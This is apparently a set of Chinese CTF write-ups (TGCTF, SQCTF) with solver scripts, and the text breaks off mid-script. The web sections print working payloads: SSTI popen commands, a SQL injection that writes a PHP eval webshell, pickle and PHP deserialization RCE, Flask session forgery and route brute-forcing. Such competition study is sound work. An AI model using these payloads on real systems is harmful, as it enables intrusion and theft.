[{"content":" web 火眼辩魑魅 访问tgshell\n直面天命 先爆破路由，得到aazz\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import requests import itertools from concurrent.futures import ThreadPoolExecutor # ===== 目标配置 ===== TARGET = \u0026#34;http://node2.tgctf.woooo.tech:32668\u0026#34; THREADS = 30 # 并发线程数 TIMEOUT = 5 # 请求超时(秒) # ===== 路由生成器 ===== def generate_routes(): chars = \u0026#39;abcdefghijklmnopqrstuvwxyz\u0026#39; for combo in itertools.product(chars, repeat=4): yield \u0026#39;/\u0026#39; + \u0026#39;\u0026#39;.join(combo) # ===== 有效性验证 ===== def check_route(route): try: url = TARGET + route resp = requests.get(url, timeout=TIMEOUT) # 有效性判断逻辑（综合状态码和内容特征） if resp.status_code == 200: # 过滤默认页面/无效页面（参考网页1的\u0026#34;var resultInfo\u0026#34;逻辑） if len(resp.text) \u0026gt; 100 and \u0026#34;404\u0026#34; not in resp.text: return True, route, len(resp.text) except Exception as e: pass return False, None, 0 # ===== 主爆破逻辑 ===== found_routes = [] def brute_worker(route): global found_routes if len(found_routes) \u0026gt;= 2: return valid, path, length = check_route(route) if valid: found_routes.append((path, length)) print(f\u0026#34;\\033[32m[+] 发现有效路由: {path} (响应长度: {length})\\033[0m\u0026#34;) # 找到两个立即停止 if len(found_routes) \u0026gt;= 2: executor.shutdown(wait=False, cancel_futures=True) # ===== 执行爆破 ===== if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;开始路由爆破，目标为4位小写字母组合...\u0026#34;) with ThreadPoolExecutor(max_workers=THREADS) as executor: futures = [] for route in generate_routes(): if len(found_routes) \u0026lt; 2: futures.append(executor.submit(brute_worker, route)) else: break # 打印最终结果 print(\u0026#34;\\n=== 爆破结果 ===\u0026#34;) if found_routes: for i, (route, length) in enumerate(found_routes): print(f\u0026#34;路由{i + 1}: {TARGET}{route} (响应长度: {length})\u0026#34;) else: print(\u0026#34;未发现有效路由\u0026#34;) misc crypto 费克特尔 分解后是5个素数，ai梭了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from Crypto.Util.number import long_to_bytes import gmpy2 # ==================== 用户输入参数 ==================== n = 810544624661213367964996895060815354972889892659483948276203088055391907479553 e = 65537 c = 670610235999012099846283721569059674725712804950807955010725968103642359765806 # 分解后的5个素数（需自行验证分解正确性） factors = [ 113, # p1 18251, # p2 2001511, # p3 214168842768662180574654641, # p4 (示例值，需替换实际分解结果) 916848439436544911290378588839845528581 # p5 (示例值，需替换实际分解结果) ] # ==================== 分解验证 ==================== def validate_factors(): product = 1 for p in factors: assert gmpy2.is_prime(p), f\u0026#34;{p} 不是素数\u0026#34; # 网页6的素数验证 product *= p assert product == n, \u0026#34;分解结果乘积不等于n\u0026#34; # 网页3的核心验证 validate_factors() # ==================== 计算私钥 ==================== phi = 1 for p in factors: phi *= (p - 1) # 多素数RSA的欧拉函数计算（网页1原理） try: d = gmpy2.invert(e, phi) # 网页3的模逆元计算 except ZeroDivisionError: raise ValueError(\u0026#34;e与φ(n)不互质，无法生成私钥\u0026#34;) # ==================== 解密过程 ==================== m = pow(c, d, n) # ==================== 结果处理 ==================== m_bytes = long_to_bytes(m) # 安全解码策略（网页5的错误处理改进） try: print(\u0026#34;文本明文:\u0026#34;, m_bytes.decode(\u0026#39;utf-8\u0026#39;)) except UnicodeDecodeError: # 处理二进制数据（网页2的建议） print(\u0026#34;检测到非文本数据，16进制输出:\u0026#34;, m_bytes.hex()) with open(\u0026#39;decrypted_data.bin\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(m_bytes) print(\u0026#34;二进制文件已保存为 decrypted_data.bin\u0026#34;) mm不躲猫猫 将数据放在1.txt，然后提取解密就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import math from Crypto.Util.number import long_to_bytes # 读取数据 try: with open(\u0026#39;1.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: # 使用 utf-8 编码 lines = f.readlines() except UnicodeDecodeError: print(\u0026#34;无法用 utf-8 编码读取文件，请检查文件内容或尝试其他编码。\u0026#34;) exit(1) data = [] for line in lines: line = line.strip() if line.startswith(\u0026#39;n = \u0026#39;) or line.startswith(\u0026#39;c = \u0026#39;): key, value = line.split(\u0026#39; = \u0026#39;) data.append((key, int(value))) ns = [] cs = [] for i in range(0, len(data), 2): ns.append(data[i][1]) cs.append(data[i+1][1]) # 寻找共同的质因数 for i in range(len(ns)): for j in range(i + 1, len(ns)): n1 = ns[i] n2 = ns[j] gcd = math.gcd(n1, n2) if gcd != 1: print(f\u0026#34;Found common factor {gcd} between n[{i}] and n[{j}]\u0026#34;) # 分解 n1 和 n2 p1 = gcd q1 = n1 // p1 p2 = gcd q2 = n2 // p2 # 计算私钥 d phi1 = (p1 - 1) * (q1 - 1) phi2 = (p2 - 1) * (q2 - 1) e = 65537 d1 = pow(e, -1, phi1) d2 = pow(e, -1, phi2) # 解密 c m1 = pow(cs[i], d1, n1) m2 = pow(cs[j], d2, n2) print(f\u0026#34;Decrypted m1: {long_to_bytes(m1)}\u0026#34;) print(f\u0026#34;Decrypted m2: {long_to_bytes(m2)}\u0026#34;) tRwSiAns 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import hashlib from Crypto.Util.number import long_to_bytes from math import isqrt # 已知参数 n = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839 e = 3 c1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366 c2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814 # 计算哈希值 def md5_hash(x): return int(hashlib.md5(str(x).encode()).hexdigest(), 16) # 计算哈希值 h1 = md5_hash(307) h2 = md5_hash(7) # 计算差值 delta_h = h1 - h2 delta_c = c1 - c2 # 构造方程 # delta_c = (m + h1)^3 - (m + h2)^3 = 3*m^2*(h1 - h2) + 3*m*(h1^2 - h2^2) + (h1^3 - h2^3) # 简化为：delta_c = 3*m^2*delta_h + 3*m*(h1^2 - h2^2) + (h1^3 - h2^3) # 进一步简化为：delta_c = 3*delta_h*m^2 + 3*(h1^2 - h2^2)*m + (h1^3 - h2^3) # 除以 delta_h S = delta_c // delta_h # 构造二次方程：3*m^2 + 3*(h1 + h2)*m + (h1^2 + h1*h2 + h2^2) - S = 0 a = 3 b = 3 * (h1 + h2) c = h1**2 + h1*h2 + h2**2 - S # 计算判别式 delta = b**2 - 4*a*c sqrt_delta = isqrt(delta) # 检查是否为完全平方 if sqrt_delta * sqrt_delta != delta: raise ValueError(\u0026#34;判别式不是完全平方，无法求解。\u0026#34;) # 求解方程 m1 = (-b + sqrt_delta) // (2 * a) m2 = (-b - sqrt_delta) // (2 * a) # 尝试解码 for m in [m1, m2]: try: flag = long_to_bytes(m) if all(32 \u0026lt;= byte \u0026lt;= 126 for byte in flag): # 检查是否为可打印字符 print(\u0026#34;解密成功，FLAG 为：\u0026#34;, flag.decode()) break except: continue ","date":"2025-04-12T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-tcgctf-write.up/","title":"2025-TCGCTF-write.up"},{"content":"战队名称：纸醉金迷\n战队排名：86\n解题情况：web-ak，cry-ak，re-4道，pwn-1道,misc-4道(包括问卷，YuanShen_Start!虽然没写出来，但是wp还是写出来了，毕竟就差一点)\nWeb Upload_Level1 先上传一个user.png,抓包，然后改文件名为.user.ini,然后上传图片马，一句话连接就好，不多说（前端限制文件头而已）\nMy Blog file.pdf有用户密码，目录扫描到login.php,登入框打前面的账号密码就可\nezGame 看到关键代码，一眼就是控制台改分数，控制台输obj.score = 10000; obj.getFlag(); 即可\n商师一日游 sqctf{\n8ec8\ne05422\n474602b\n873f0b36\na57c0\n3f}\n最终flag是sqctf{8ec8e05422474602b873f0b36a57c03f}\neeaassyy ctrl+u与右键禁用，打开更多工具，然后点开发人员工具即可看到。\n逃 deepseek一把梭\nbaby include 打日志包含\n唯一 直觉ssti，笔记就是note，过滤了一些关键词\n有点疑问，过滤了关键词，引号绕过不了，还得把下划线一起过滤才行\nThrough 目录穿越，写的很少，还需要双写绕过，payload：file=....//....//....///flag\n目录穿越/遍历漏洞 \u0026ndash; 学习笔记_目录遍历漏洞描述-CSDN博客\nFile_download 提示xml，那就是xml泄露，网上搜了差不多一样的题\n1 filename=WEB-INF/classes/com/ctf/flag/FlagManager.class 然后将这个乱码复制到一个txt文件，改后缀为class，然后跑到[/s/1744130315784/]的目录列表这个网站去java反编译，得到java文件\n接下来本来参考CTF攻防赛java反编译题_ctf class反编译-CSDN博客这个博客要运行代码，但是直接给deepseek梭了\n参考WEB-INF/web.xml泄露漏洞及其利用_web-inf-web-xml-disclosure-CSDN博客\n嘿嘿嘿 此题干扰不少，其实xxx,yyy用不到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 \u0026lt;?php class hhh { public $file; public $content; public function __construct($file, $content) { $this-\u0026gt;file = $file; $this-\u0026gt;content = $content; } public function __destruct() { if ($this-\u0026gt;file \u0026amp;\u0026amp; $this-\u0026gt;content) { if (strpos($this-\u0026gt;file, \u0026#39;flag\u0026#39;) !== false) { die(\u0026#34;No flag file!\u0026#34;); } if (file_exists($this-\u0026gt;file)) { die(\u0026#34;File already exists!\u0026#34;); } file_put_contents($this-\u0026gt;file, $this-\u0026gt;content); } } } class xxx { public $data; public function __construct($data) { $this-\u0026gt;data = $data; } public function __toString() { return $this-\u0026gt;data; } } class yyy { public $path; public $allowed; public function __construct($path, $allowed) { $this-\u0026gt;path = $path; $this-\u0026gt;allowed = $allowed; } public function __toString() { if ($this-\u0026gt;allowed) { return file_get_contents($this-\u0026gt;path); } else { return \u0026#34;Access Denied!\u0026#34;; } } } $obj=new hhh($file,$content); $obj-\u0026gt;file=\u0026#34;data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\u0026#34;; $obj-\u0026gt;content=\u0026#34;GET_FLAG\u0026#34;; // 生成序列化数据 $payload = serialize($obj); echo $payload; echo urlencode($payload); ?\u0026gt; 答案在源码！一开始我还以为无回显！还有，这里file可以直接为空，因为我这伪协议好像没任何作用，只是为了绕过waf而已，但是这里为空也行。这里是测试了一下file_get_content函数读file的话结果是base64解码后的值。\n参考：CG-CTF web之 file_get_contents_die(\u0026lsquo;file get contents! file! get! contents!\u0026rsquo;);-CSDN博客\nPing RceMe Input a number Ez_calculate ai一把梭，flag在/flag，逆天本来目录爆破就有的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 import requests import re import time from bs4 import BeautifulSoup TARGET_URL = \u0026#34;http://challenge.qsnctf.com:32621/\u0026#34; MAX_TIME = 1.9 # 最大允许时间（留出0.1秒余量） RETRY_DELAY = 0.01 # 失败后重试间隔 def solve_challenge(): session = requests.Session() session.headers.update({ \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 CTF Solver\u0026#39; }) while True: start_time = time.perf_counter() response_text = \u0026#34;\u0026#34; try: # 1. 快速获取页面 try: response = session.get(TARGET_URL, timeout=0.3) if response.status_code != 200: print(f\u0026#34;[!] 获取失败 HTTP {response.status_code}\u0026#34;) time.sleep(RETRY_DELAY) continue except requests.exceptions.RequestException as e: print(f\u0026#34;[!] 连接错误: {str(e)}\u0026#34;) time.sleep(RETRY_DELAY) continue # 2. 快速解析数学题目 soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) challenge_div = soup.find(\u0026#39;div\u0026#39;, class_=\u0026#39;challenge\u0026#39;) if not challenge_div: print(\u0026#34;[!] 未找到题目div\u0026#34;) time.sleep(RETRY_DELAY) continue problem_text = challenge_div.text.strip() print(f\u0026#34;[+] 当前题目: {problem_text}\u0026#34;) # 3. 安全计算答案（支持多运算符） try: # 使用更安全的计算方式替代eval def safe_calc(expr): tokens = re.findall(r\u0026#39;(\\d+|[\\+\\-\\*/])\u0026#39;, expr.replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;)) total = int(tokens[0]) for i in range(1, len(tokens), 2): op, num = tokens[i], int(tokens[i+1]) if op == \u0026#39;+\u0026#39;: total += num elif op == \u0026#39;-\u0026#39;: total -= num elif op == \u0026#39;*\u0026#39;: total *= num elif op == \u0026#39;/\u0026#39;: total //= num return total answer = safe_calc(problem_text) print(f\u0026#34;[√] 计算结果: {answer}\u0026#34;) except Exception as e: print(f\u0026#34;[!] 计算错误: {str(e)}\u0026#34;) time.sleep(RETRY_DELAY) continue # 4. 快速提交并获取响应 elapsed = time.perf_counter() - start_time remaining_time = max(0.05, MAX_TIME - elapsed) try: submit_response = session.post( TARGET_URL, data={\u0026#39;value\u0026#39;: answer}, timeout=(0.2, remaining_time) ) total_time = (time.perf_counter() - start_time) * 1000 print(f\u0026#34;[↑] 提交成功! 用时: {total_time:.1f}ms\u0026#34;) # 打印完整响应 print(\u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34;*40) print(\u0026#34;服务器响应:\u0026#34;) print(submit_response.text) print(\u0026#34;=\u0026#34;*40 + \u0026#34;\\n\u0026#34;) # 检查CTF标志 if re.search(r\u0026#39;ctf|CTF\u0026#39;, submit_response.text, re.IGNORECASE): print(\u0026#34;[★] 发现CTF标志，挑战完成！\u0026#34;) return submit_response.text except requests.exceptions.Timeout: print(f\u0026#34;[!] 提交超时 (剩余时间: {remaining_time*1000:.1f}ms)\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;[!] 提交错误: {str(e)}\u0026#34;) except Exception as e: print(f\u0026#34;[!] 系统错误: {str(e)}\u0026#34;) # 精确控制重试间隔 elapsed = time.perf_counter() - start_time if elapsed \u0026lt; RETRY_DELAY: time.sleep(RETRY_DELAY - elapsed) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;=\u0026#34;*50) print(\u0026#34;高速数学挑战解题器 - 2秒限时模式\u0026#34;) print(\u0026#34;=\u0026#34;*50) result = solve_challenge() if result: with open(\u0026#34;ctf_flag.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(result) print(\u0026#34;响应已保存到 ctf_flag.txt\u0026#34;) Upload_Level2 上面的文件上传是前端检测，这个是content检测，其实只要先上传一个图片马，然后改成php即可，开始想的很麻烦，用.user.ini想秒，但是不知道为啥没成功，仔细一下就这样秒了，太思维定式了。\nbaby rce 直接秒\n白月光 测出来是ssti，没测waf，直接打payload，运气不错\n1 {{lipsum[\u0026#39;\\x5f\\x5fglob\u0026#39;\u0026#39;als\\x5f\\x5f\u0026#39;][\u0026#39;o\u0026#39;\u0026#39;s\u0026#39;].popen(\u0026#39;cat /fla?\u0026#39;).read()}} 小小查询系统-（写马连数据库） 1 id=-1\u0026#39; union select 1,2,\u0026#39;\u0026lt;?php eval($_REQUEST[1]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/1.php\u0026#39;--+ 然后蚁剑连接，文件里面的flag是假的，先找到源码，发现连接数据库的用户密码（其实源码都在网站目录下面，cat *所有源码就出来了，或者连接上一个个查看也行）\n连接后发现flag再cft里面\n无参之舞 先扫描目录\n1 var_dump(file_get_contents(%27f1ag.php%27)); 哎呀大大大黑塔 GET传SQNU=BV1tXckehEd3（就bv号）\n之后就简单了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php class Secret { public $key; public function __construct($key) { $this-\u0026gt;key = $key; } public function __destruct() { if ($this-\u0026gt;key === \u0026#34;SQCTF\u0026#34;) { include \u0026#34;./flag.php\u0026#34;; echo \u0026#34;flag : \u0026#34;.$flag; } else { echo \u0026#34;Try harder!\u0026#34;; } } } $a=new Secret($key); $a-\u0026gt;key=\u0026#34;SQCTF\u0026#34;; echo serialize($a); echo \u0026#34;\\n\u0026#34;.urlencode(serialize($a)).\u0026#34;\\n\u0026#34;; 出的很怪。\n伪装 先seesion解密\n1 修改{\u0026#39;role\u0026#39;: {\u0026#39;is_admin\u0026#39;: 0, \u0026#39;name\u0026#39;: \u0026#39;aiyamaya\u0026#39;}}为{\u0026#39;role\u0026#39;: {\u0026#39;is_admin\u0026#39;: 1, \u0026#39;name\u0026#39;: \u0026#39;sjx\u0026#39;}} 参考:[HCTF 2018]admin \u0026mdash; flask session 的加密解密_session解密-CSDN博客\n图片展示功能 就是打.htaccess\n之后蚁剑连接就好\n开发人员的小失误 扫描出来\n打开就是flag\nggoodd Are you from SQNU? 按下按钮有参数tyctf，然后用这个参数post随便传，然后出现提示（之后这个tyctf不能删，否则打不通）\n接下来安装提示打就行\n接下来太简单了，不一一展示\nLook for the homepage pickle 最基础的pickle\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import pickle import base64 import os class A(object): def __reduce__(self): return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;tac /flag\u0026#39;).read()\u0026#34;,)) payload = pickle.dumps(A()) b64_payload = base64.b64encode(payload) print(payload) print(b64_payload.decode()) 千查万别 先读/app/app.py得到源码，分析一下源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;pre\u0026gt;from flask import Flask, request, render_template_string, session import os app = Flask(__name__) app.secret_key = os.environ.get(\u0026#39;SECRET_KEY\u0026#39;, os.urandom(16)) @app.route(\u0026#39;/\u0026#39;) def index(): username = session.get(\u0026#39;username\u0026#39;, \u0026#39;guest\u0026#39;) template = f\u0026#39;\u0026#39;\u0026#39; \u0026lt;h1\u0026gt;欢迎，{username}！\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/view\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; 输入文档ID: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;doc\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;查看\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026#39;\u0026#39;\u0026#39; return render_template_string(template) @app.route(\u0026#39;/view\u0026#39;) def view_doc(): doc = request.args.get(\u0026#39;doc\u0026#39;, \u0026#39;test.txt\u0026#39;) base_dir = \u0026#39;/app/static/docs\u0026#39; filepath = os.path.realpath(os.path.join(base_dir, doc)) if filepath == \u0026#39;/flag\u0026#39;: return \u0026#34;非法路径！\u0026#34; try: with open(filepath, \u0026#39;r\u0026#39;) as f: content = f.read() return f\u0026#34;\u0026lt;pre\u0026gt;{content}\u0026lt;/pre\u0026gt;\u0026#34; except: return \u0026#34;文档不存在！\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) \u0026lt;/pre\u0026gt; 看到render_template_string(template) 显然就是打ssti，注入点是seesion里的username，所以要进行session加密解密，key在环境变量里，用/proc/self/environ 就可以看到了\n1 Dark_Flame 接下来session伪造可以用工具伪造（但是原session不可以解密？？那只能直接伪造其中的数据）\n也可以用代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from flask import Flask, session from flask.sessions import SecureCookieSessionInterface import base64 import json import os app = Flask(__name__) app.secret_key = \u0026#34;Dark_Flame\u0026#34; # 创建一个会话对象 session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) # 要序列化的数据 data = { \u0026#39;username\u0026#39;: \u0026#34;{{lipsum.__globals__.os.popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34; } # 序列化并加密数据 serialized = session_serializer.dumps(data) print(\u0026#34;Encoded session:\u0026#34;, serialized) # 如果需要解码，可以使用以下代码 decoded = session_serializer.loads(serialized) print(\u0026#34;Decoded session:\u0026#34;, decoded) Look for the homepage 打开标头看见路由\n然后一个这个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php error_reporting(0); include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); // 怎么在不知道flag.php中的code和flag的情况下绕过? 我不造啊!!! if(isset($_GET[\u0026#39;pass1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;pass2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;verify\u0026#39;])){ $pass1 = (String)$_GET[\u0026#39;pass1\u0026#39;]; $pass2 = (String)$_GET[\u0026#39;pass2\u0026#39;]; $verify_code = (String)$_GET[\u0026#39;verify\u0026#39;]; if($verify_code === $code \u0026amp;\u0026amp;$pass1 === $flag || $pass2 === \u0026#34;welcome\u0026#34;){ echo \u0026#34;Level1 Pass\\n\u0026#34;; echo \u0026#34;关关难过关关过 !!!\u0026#34;; if(isset($_POST[\u0026#39;value1\u0026#39;])){ $value1 = $_POST[\u0026#39;value1\u0026#39;]; $value3 = $_GET[\u0026#39;value3\u0026#39;]; parse_str($value1,$a); if($a[\u0026#39;fly\u0026#39;]==md5($value3)){ echo \u0026#34;Level2 Pass\\n\u0026#34;; echo $flag; } } else{ echo \u0026#34;想想看parse_str是干嘛的来着\\n\u0026#34;; } } else{ echo \u0026#34;你小子就是这样绕过的吗 ???\\n\u0026#34;; } } Look for the homepage 简单考个md5与parse_str性质\n自私的小s 提示入口可能不对，抓包发现在cookie\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php highlight_file(__FILE__); class Genshin_impact{ private $value; public function __construct($v){ $this-\u0026gt;value = $v; } function __destruct(){ echo eval($this-\u0026gt;value); } } $payload=$_GET[\u0026#39;payload\u0026#39;]; $payload=str_replace(\u0026#34;%\u0026#34;,\u0026#34;nonono\u0026#34;,$payload); unserialize($payload); ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php class Genshin_impact{ private $value; public function __construct($v){ $this-\u0026gt;value = $v; } function __destruct(){ echo eval($this-\u0026gt;value); } } $a=new Genshin_impact(\u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;); echo urlencode(serialize($a)); 1 O%3A14%3A%22Genshin_impact%22%3A1%3A%7Bs%3A21%3A%22%00Genshin_impact%00value%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D 这里由于过滤了%，所以要url编码\nCrypto 春风得意马蹄疾 社会主义编码，嵌套了几次，一直解码社会主义解码即可\n别阴阳我了行吗？ 直接解码\nbase？ base64换表，直接去厨子里面尝试这些表即可\n简单RSA ai一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from Crypto.Util.number import long_to_bytes # 公钥和密文参数 e = 65537 n = 7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533 c = 3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616 # 分解 n 得到的质因数 p 和 q p = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261 q = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753 # 验证 p 和 q 是否正确（关键步骤！） assert p * q == n, \u0026#34;分解错误：p * q ≠ n\u0026#34; # 计算欧拉函数 φ(n) phi = (p - 1) * (q - 1) # 计算私钥 d（e 的模逆元） d = pow(e, -1, phi) # 解密密文 c m = pow(c, d, n) # 将明文转换为字节并输出 plaintext = long_to_bytes(m) # 尝试 UTF-8 解码，失败则直接输出字节 try: print(plaintext.decode(\u0026#39;utf-8\u0026#39;)) except UnicodeDecodeError: print(\u0026#34;解密后的字节流（可能包含非 UTF-8 字符）:\u0026#34;, plaintext) factordb.com：分解网站\nezCRT 依旧deepseek一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import math from functools import reduce import gmpy2 from Crypto.Util.number import long_to_bytes # 给定参数（保持不变） n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681 n2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063 n3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093 c1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165 c2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023 c3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614 # 验证模数互质 assert math.gcd(n1, n2) == 1 and math.gcd(n1, n3) == 1 and math.gcd(n2, n3) == 1, \u0026#34;模数不互质\u0026#34; # 中国剩余定理（CRT）合并 def crt(remainders, moduli): N = reduce(lambda x, y: x * y, moduli) result = 0 for r, m in zip(remainders, moduli): Ni = N // m inv = pow(Ni, -1, m) result += r * Ni * inv return result % N m_cubed = crt([c1, c2, c3], [n1, n2, n3]) # 计算立方根并验证精确性 m, is_exact = gmpy2.iroot(m_cubed, 3) if not is_exact: raise ValueError(\u0026#34;立方根不精确，可能存在错误\u0026#34;) # 转换为字节流 plaintext = long_to_bytes(m) # 精确提取 Flag（根据已知前缀 \u0026#34;SQCTF{\u0026#34; 手动定位） flag_start = plaintext.find(b\u0026#39;SQCTF{\u0026#39;) # 搜索 Flag 起始位置 if flag_start != -1: flag_end = plaintext.find(b\u0026#39;}\u0026#39;, flag_start) + 1 # 找到闭合的 \u0026#39;}\u0026#39; flag = plaintext[flag_start:flag_end].decode(\u0026#39;utf-8\u0026#39;) else: # 暴力扫描可打印字符 flag_bytes = [] for b in plaintext: if 32 \u0026lt;= b \u0026lt;= 126: # ASCII 可打印范围 flag_bytes.append(b) else: break # 遇到非打印字符终止 flag = bytes(flag_bytes).decode(\u0026#39;utf-8\u0026#39;, \u0026#39;ignore\u0026#39;) print(\u0026#34;解密结果:\u0026#34;, flag) 失落矿洞中的密码 deepseek一把梭，然后在线找个sage环境\n小白兔白又白 随波逐流一把梭加rabbit解密\n丢三落四的小I 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import gmpy2 from Crypto.Util.number import long_to_bytes n = 